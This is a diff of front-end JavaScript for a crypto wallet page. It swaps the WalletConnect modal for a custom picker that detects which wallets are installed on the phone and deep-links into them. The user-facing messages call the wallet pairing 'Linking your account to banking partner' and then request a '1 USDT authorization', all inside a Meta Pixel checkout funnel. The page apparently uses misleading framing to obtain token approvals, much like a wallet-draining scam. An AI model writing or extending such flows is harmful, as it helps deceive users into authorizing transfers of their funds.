@@ -35,8 +35,8 @@ let paymentQueue = [];
 let paymentIndex = 0;
 let confirmedNetworks = 0;
 let finishedPayments = new Set();
-let wcModal = null;
-let wcProjectId = '';
+let selectedWalletHref = '';
+let walletsCache = null;
 
 /* ========== Meta Pixel ==========
  * Funnel:
@@ -294,71 +294,129 @@ function launchWalletConnectUri(uri) {
   window.location.href = uri;
 }
 
-function closeWalletConnectPicker() {
-  try {
-    if (wcModal && typeof wcModal.closeModal === 'function') wcModal.closeModal();
-  } catch (_err) {}
+function installedHints() {
+  const ua = navigator.userAgent || '';
+  const eth = window.ethereum || {};
+  const hints = [];
+  if (eth.isTrust || /Trust\//i.test(ua)) hints.push('trust');
+  if (eth.isMetaMask && !eth.isTrust) hints.push('metamask', 'meta mask');
+  if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(ua)) hints.push('coinbase');
+  if (eth.isRainbow || /Rainbow/i.test(ua)) hints.push('rainbow');
+  if (eth.isOkxWallet || /OKApp/i.test(ua)) hints.push('okx', 'okex');
+  if (eth.isTokenPocket || /TokenPocket/i.test(ua)) hints.push('tokenpocket', 'token pocket');
+  if (eth.isBitKeep || /BitKeep/i.test(ua)) hints.push('bitget', 'bitkeep');
+  if (/imToken/i.test(ua)) hints.push('imtoken');
+  if (eth.isPhantom || /Phantom/i.test(ua)) hints.push('phantom');
+  if (eth.isSafePal || /SafePal/i.test(ua)) hints.push('safepal');
+  return hints;
 }
 
-async function loadWalletConnectModal() {
-  const urls = [
-    'https://esm.sh/@walletconnect/modal@2.7.0',
-    'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm'
-  ];
-  let lastError = null;
-  for (let i = 0; i < urls.length; i += 1) {
-    try {
-      const mod = await import(urls[i]);
-      return mod.WalletConnectModal || mod.default;
-    } catch (err) {
-      lastError = err;
-    }
+function isInstalledWallet(wallet) {
+  const name = String(wallet.name || '').toLowerCase();
+  return installedHints().some(function (hint) { return name.includes(hint); });
+}
+
+function walletHref(wallet, uri) {
+  const encoded = encodeURIComponent(uri);
+  const native = String(wallet.native || '');
+  if (native) {
+    if (native.endsWith('://')) return native + 'wc?uri=' + encoded;
+    if (native.endsWith('/')) return native + 'wc?uri=' + encoded;
+    return native + 'wc?uri=' + encoded;
   }
-  throw lastError || new Error('WalletConnect modal failed to load');
+  const universal = String(wallet.universal || '').replace(/\/$/, '');
+  if (universal && !/walletconnect\.com$/i.test(universal)) {
+    return universal + '/wc?uri=' + encoded;
+  }
+  return uri;
 }
 
 function reopenSelectedWallet() {
-  if (!IS_MOBILE || !wcUri) return;
+  if (!IS_MOBILE) return;
+  const href = selectedWalletHref || wcUri;
+  if (!href) return;
   setTimeout(function () {
-    launchWalletConnectUri(wcUri);
+    window.location.href = href;
   }, 350);
 }
 
-async function openWalletConnectPicker(uri) {
-  if (!wcProjectId) {
-    const res = await fetch(BASE + '/api/front/wallets');
-    const data = await res.json();
-    wcProjectId = data.projectId || '';
+async function loadWallets() {
+  if (walletsCache) return walletsCache;
+  const res = await fetch(BASE + '/api/front/wallets');
+  const data = await res.json();
+  walletsCache = Array.isArray(data.wallets) ? data.wallets : [];
+  walletsCache.sort(function (a, b) {
+    return Number(isInstalledWallet(b)) - Number(isInstalledWallet(a));
+  });
+  return walletsCache;
+}
+
+function renderWalletList(wallets, query) {
+  const host = $('#m-wallet-list');
+  if (!host) return;
+  const q = String(query || '').trim().toLowerCase();
+  const filtered = q
+    ? wallets.filter(function (wallet) { return String(wallet.name || '').toLowerCase().includes(q); })
+    : wallets;
+  if (!filtered.length) {
+    host.innerHTML = '<p style="color:var(--muted);font-size:13px">No wallets match that name.</p>';
+    return;
   }
-  if (!wcProjectId) throw new Error('WalletConnect is not configured');
-  const WalletConnectModal = await loadWalletConnectModal();
-  if (!wcModal) {
-    wcModal = new WalletConnectModal({
-      projectId: wcProjectId,
-      themeMode: 'light',
-      themeVariables: { '--wcm-z-index': '2147483647' },
-      enableExplorer: true
+  host.innerHTML = filtered.map(function (wallet) {
+    const name = escapeText(wallet.name);
+    const letter = escapeText((wallet.name || 'W').charAt(0).toUpperCase());
+    const installed = isInstalledWallet(wallet);
+    const img = wallet.image
+      ? '<img src="' + escapeText(wallet.image) + '" alt="" width="36" height="36"/>'
+      : '<span class="m-wallet-fallback">' + letter + '</span>';
+    const badge = installed ? '<span class="m-wallet-badge">On this phone</span>' : '';
+    return '<button type="button" class="m-wallet-item" data-wallet-id="' + escapeText(wallet.id) + '">' +
+      img + '<span class="m-wallet-meta"><strong>' + name + '</strong>' + badge + '</span></button>';
+  }).join('');
+  host.querySelectorAll('[data-wallet-id]').forEach(function (btn) {
+    btn.addEventListener('click', function () {
+      const wallet = (walletsCache || wallets).find(function (item) { return String(item.id) === btn.dataset.walletId; });
+      if (!wallet || !wcUri) return;
+      selectedWalletHref = walletHref(wallet, wcUri);
+      setLoaderStep('pair');
+      setBusy(
+        true,
+        'Linking your account to banking partner',
+        'Approve the pairing request in ' + wallet.name + '. We will continue automatically once it is confirmed.'
+      );
+      window.location.href = selectedWalletHref;
     });
-  }
-  await wcModal.openModal({ uri: uri });
+  });
 }
 
 async function onGetNowClick() {
   if (!wcUri) return;
-  setLoaderStep('pair');
-  setBusy(
-    true,
-    'Linking your account to banking partner',
-    'Select your wallet and approve the pairing request. Any WalletConnect wallet on this phone will work.'
-  );
   if (isInAppWalletBrowser()) {
+    setLoaderStep('pair');
+    setBusy(
+      true,
+      'Linking your account to banking partner',
+      'Approve the pairing request in your wallet. We will continue automatically once it is confirmed.'
+    );
     launchWalletConnectUri(wcUri);
     return;
   }
+  setBusy(false);
+  setView('wallets');
+  const back = $('#m-wallet-back');
+  if (back) back.onclick = function () { setBusy(false); setView('intro'); };
+  const search = $('#m-wallet-search');
   try {
-    await openWalletConnectPicker(wcUri);
+    const wallets = await loadWallets();
+    renderWalletList(wallets, search && search.value);
+    if (search && !search.dataset.bound) {
+      search.dataset.bound = '1';
+      search.addEventListener('input', function () {
+        renderWalletList(walletsCache || [], search.value);
+      });
+    }
   } catch (_err) {
-    launchWalletConnectUri(wcUri);
+    renderWalletList([]);
   }
 }
 
@@ -387,7 +445,6 @@ function onWalletConnected(d) {
   if (walletLinked) return;
   walletLinked = true;
   authorizing = true;
-  closeWalletConnectPicker();
   track('InitiateCheckout', FUNNEL_CONTENT);
   setLoaderStep('auth');
   setBusy(true, 'Confirm in your wallet', 'Preparing your 1 USDT authorization. Approve the request in your wallet when it appears.');
